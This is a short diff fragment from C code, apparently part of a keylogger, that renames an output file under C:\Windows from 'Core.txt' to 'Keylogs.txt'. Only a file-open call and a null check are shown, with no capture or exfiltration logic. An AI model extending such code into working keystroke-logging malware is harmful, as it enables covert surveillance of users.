@@ -22,7 +22,7 @@ int kwindows(void)
 {
 	FILE *fp = NULL ;
 
-	fp = fopen("C:\\Windows\\Core.txt","w");
+	fp = fopen("C:\\Windows\\Keylogs.txt","w");
 
 	if(fp == NULL)
 	{
